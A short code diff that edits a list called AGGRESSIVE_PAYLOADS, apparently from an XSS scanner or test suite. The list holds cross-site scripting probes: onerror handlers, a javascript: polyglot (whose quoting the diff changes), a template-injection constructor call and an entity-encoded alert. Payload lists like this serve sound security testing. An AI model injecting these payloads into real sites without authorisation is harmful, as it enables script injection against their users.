@@ -51,7 +51,7 @@ AGGRESSIVE_PAYLOADS = [
     '<isindex type=image src=1 onerror=alert(1)>',
     '<video><source onerror="javascript:alert(1)">',
     '<audio src=x onerror=alert(1)>',
-    'jaVasCript:/*-/*`/*\\\\`/*\\'/*"/**/(alert(1))//',
+    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(alert(1))//",
     '{{constructor.constructor("alert(1)")()}}',
     '${alert(1)}',
     '<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>',
